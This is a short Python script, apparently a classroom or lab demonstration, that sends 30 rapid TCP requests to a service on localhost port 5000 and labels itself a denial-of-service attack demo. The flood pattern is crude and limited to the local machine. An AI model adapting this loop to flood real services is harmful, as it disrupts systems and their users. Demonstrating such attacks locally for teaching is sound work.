import socket
import time

HOST = "127.0.0.1"
PORT = 5000
NUMBER_OF_REQUESTS = 30

print("DoS Attack Demonstration")
print(f"Sending {NUMBER_OF_REQUESTS} rapid requests to {HOST}:{PORT}")
print("This demonstration targets localhost only.")

successful = 0

for i in range(NUMBER_OF_REQUESTS):
    try:
        attacker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        attacker.settimeout(1)
        attacker.connect((HOST, PORT))
        attacker.send(b"Repeated request from DoS demonstration")
        attacker.recv(1024)
        attacker.close()
        successful += 1
        print(f"Request {i + 1}/{NUMBER_OF_REQUESTS} sent")
    except Exception as e:
        print(f"Request {i + 1} failed: {e}")
    time.sleep(0.05)

print("\nAttack demonstration finished.")
print(f"Requests successfully sent: {successful}/{NUMBER_OF_REQUESTS}")
